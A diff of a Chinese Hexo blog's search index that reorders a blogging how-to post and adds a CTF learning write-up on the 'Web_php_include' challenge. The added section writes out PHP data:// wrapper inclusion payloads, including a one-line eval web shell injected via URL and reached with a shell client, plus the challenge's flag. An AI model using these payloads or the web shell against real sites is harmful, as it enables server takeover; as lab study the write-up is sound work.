@@ -1,50 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>博客文章编写方式</title>
-    <url>/2022/10/15/17-58-19/</url>
-    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
-<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
-<p>然后就是上传图片的操作了</p>
-<p>这是原帖子链接</p>
-<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
-<p>下面我先简单演示</p>
-<p>创建一个新的imgs文件夹,位于</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
-<p>source 目录下</p>
-<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
-<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
-<p>在”格式””图像””设置图片根目录”</p>
-<p>成功后</p>
-<p>如图:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
-<p>随后就是插入图片</p>
-<p>在”格式” “图像” “插入图片”</p>
-<p>一定要记得将图片放在imgs 文件夹中</p>
-<p>这样引用图片时才不会出错</p>
-<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
-<p>最后放上我可爱的草神:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
-]]></content>
-      <categories>
-        <category>使用说明</category>
-      </categories>
-      <tags>
-        <tag>hexo博客搭建说明</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctf学习笔记</title>
     <url>/2022/10/19/10-48-16/</url>
     <content><![CDATA[<h1 id="新开一章主要用来记载ctf比赛的学习"><a href="#新开一章主要用来记载ctf比赛的学习" class="headerlink" title="新开一章主要用来记载ctf比赛的学习"></a>新开一章主要用来记载ctf比赛的学习</h1><h1 id="在开始前我们得知道什么是ctf"><a href="#在开始前我们得知道什么是ctf" class="headerlink" title="在开始前我们得知道什么是ctf"></a>在开始前我们得知道什么是ctf</h1><p>ctf是属网络信息安全夺旗赛</p>
@@ -111,6 +67,46 @@
 <p>usb鼠标流量分析</p>
 <p>鼠标流量分析脚本</p>
 <p>https流量包分析</p>
+<h1 id="web项目学习"><a href="#web项目学习" class="headerlink" title="web项目学习"></a>web项目学习</h1><h2 id="ctf题目：攻防世界：难度2的-Web-php-include题目"><a href="#ctf题目：攻防世界：难度2的-Web-php-include题目" class="headerlink" title="ctf题目：攻防世界：难度2的 Web_php_include题目"></a>ctf题目：攻防世界：难度2的 Web_php_include题目</h2><p>链接：<a href="https://adworld.xctf.org.cn/challenges/details?hash=ce6391a6-7070-4410-9d33-5b23967e77f1_2&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=ce6391a6-7070-4410-9d33-5b23967e77f1_2&amp;task_category_id=3</a></p>
+<p>此题目突破口是php伪协议的运用，</p>
+<p>具体解题可以参考：<a href="https://blog.csdn.net/Mr_helloword/article/details/107929653"> 攻防世界-Web_php_include详解_Mr H的博客-CSDN博客</a></p>
+<p>php伪协议：<a href="https://blog.csdn.net/qq_53142368/article/details/116594299"> PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a></p>
+<h2 id="我的解题过程"><a href="#我的解题过程" class="headerlink" title="我的解题过程"></a>我的解题过程</h2><p>当我拿到题目的时候看到页面如下</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024155409.png"></p>
+<p>第一时间就使用后台扫描工具：御剑 对网站后台进行了扫描</p>
+<p>扫描发现了一个phpmyadmin界面，当时我就想到fly师傅里面记载的phpmyadmin的漏洞利用，翻去查看</p>
+<p>（此网站phpmyadmin后台是无密码的root登录）</p>
+<p>通过一系列操作下来后发现使用phpmyadmin漏洞来解决此题目有点费脑子，因为在运用全局日志文件写入shell和其他方式写入shell都离不开文件的绝对路径，</p>
+<p>在扫描以及信息收集中发现该网站的路径就给了一个“/”并没给出绝对路径，</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024160357.png"></p>
+<p>所以暂时运用phpmyadmin后台那shell的方法不可取</p>
+<h2 id="搜攻略"><a href="#搜攻略" class="headerlink" title="搜攻略"></a>搜攻略</h2><p>在攻略中，老哥给了我们三种通过PHP伪协议拿flag的方法，前两种我都成功拿到了flag，</p>
+<p>但老哥没给出第三种过程，现在我复现一下。</p>
+<h3 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用法：</span><br><span class="line">data://text/plain,xxxx(要执行的php代码)</span><br><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br><span class="line">例：</span><br><span class="line">?page=data://text/plain,</span><br><span class="line">?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>data伪协议:</p>
+<p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
+<p>在这题里面我们通过使用data伪协议写入我们的shell语句</p>
+<p><a href="http://61.147.171.105:52808/?page=data://text/plain,%3C?php%20@eval($_POST%5B666%5D);%20?%3E">http://61.147.171.105:52808/?page=data://text/plain,%3C?php%20@eval($_POST[666]);%20?%3E</a>      (<?php @eval($_POST[666]); ?>)</p>
+<p><a href="http://61.147.171.105:52808/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzY2Nl0pOyA/Pg==">http://61.147.171.105:52808/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzY2Nl0pOyA/Pg==</a></p>
+<p>两种方式我都试过了,在这题里并没有拦截,使用base64编码和不使用也可以写入shell</p>
+<p>使用菜刀链接到我们的shell</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20221024161817842-1666599525637.png"></p>
+<p>可以看到网站的文件目录,(但我找不到flag文件在哪里,只好抄作业了)</p>
+<p>直接使用虚拟终端cat  打开flag文件</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024162228.png"></p>
+<p>flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&quot;ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意:flag一般形式都不同,像本题就是在=”…”里面: ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p>
+<h2 id="php危险函数"><a href="#php危险函数" class="headerlink" title="php危险函数"></a>php危险函数</h2><p>此题里面因为存在危险函数:show_source()  才能使用php伪协议破解题目</p>
+<p>所以我们在做题时要留意题中出现的函数是什么有什么功能,不懂可以百度</p>
+<p><strong>重要的还是要细心看题才行,不要养成看到代码就跳过的习惯,不然就白学了.</strong></p>
+<p>show_source() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。</p>
+<p>用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。</p>
+<p>show_source() 是 <a href="https://www.runoob.com/php/func-misc-highlight-file.html">highlight_file()</a> 的别名。</p>
+<p><strong>注释：</strong>当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！</p>
+<p><img src="/imgs/$%7Bfiilename%7D/3.gif"></p>
 ]]></content>
       <categories>
         <category>ctf</category>
@@ -254,6 +250,50 @@
       </categories>
       <tags>
         <tag>内网学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客文章编写方式</title>
+    <url>/2022/10/15/17-58-19/</url>
+    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
+<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
+<p>然后就是上传图片的操作了</p>
+<p>这是原帖子链接</p>
+<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
+<p>下面我先简单演示</p>
+<p>创建一个新的imgs文件夹,位于</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
+<p>source 目录下</p>
+<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
+<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
+<p>在”格式””图像””设置图片根目录”</p>
+<p>成功后</p>
+<p>如图:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
+<p>随后就是插入图片</p>
+<p>在”格式” “图像” “插入图片”</p>
+<p>一定要记得将图片放在imgs 文件夹中</p>
+<p>这样引用图片时才不会出错</p>
+<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
+<p>最后放上我可爱的草神:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
+]]></content>
+      <categories>
+        <category>使用说明</category>
+      </categories>
+      <tags>
+        <tag>hexo博客搭建说明</tag>
       </tags>
   </entry>
   <entry>
